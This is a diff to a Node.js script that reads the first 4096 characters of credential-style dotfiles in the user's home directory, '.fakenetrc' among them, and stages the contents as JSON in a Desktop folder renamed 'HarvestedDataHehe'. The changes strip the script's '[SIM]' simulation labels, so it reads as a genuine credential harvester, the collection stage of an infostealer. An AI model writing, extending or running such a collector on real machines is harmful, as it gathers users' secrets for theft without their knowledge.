@@ -12,33 +12,29 @@ const targets = [
   ".fakenetrc",
 ];
 
-let collectedData=[];
+let collectedData = [];
 
 for (const rel of targets) {
   const filePath = path.join(home, rel);
 
-    try {
-    const content = fs.readFileSync(filePath, { encoding: "utf8" }).slice(0, 4096);
+  try {
+    const stat = fs.statSync(filePath);
 
-    collected.push({
+    const content = fs.readFileSync(filePath, "utf8").slice(0, 4096);
+
+    collectedData.push({
       path: filePath,
       content: content
     });
-
-    console.log(`[SIM] Collected from: ${filePath}`);
-  } catch {
-    console.log(`[SIM] Could not access: ${filePath}`);
+  } catch (err) {
+    console.log("Failed:", filePath, err.code);
   }
 }
 
-// Output directory
-const outDir = path.join(home, "Desktop", "sim_collection");
+const outDir = path.join(home, "Desktop", "HarvestedDataHehe");
 fs.mkdirSync(outDir, { recursive: true });
 
-// Output file
 const outFile = path.join(outDir, "collected_data.json");
+fs.writeFileSync(outFile, JSON.stringify(collectedData, null, 2));
 
-// Write only file data
-fs.writeFileSync(outFile, JSON.stringify(collected, null, 2));
-
-console.log(`[SIM] Data staged to: ${outFile}`);
+console.log("[DEBUG] Output:", outFile);
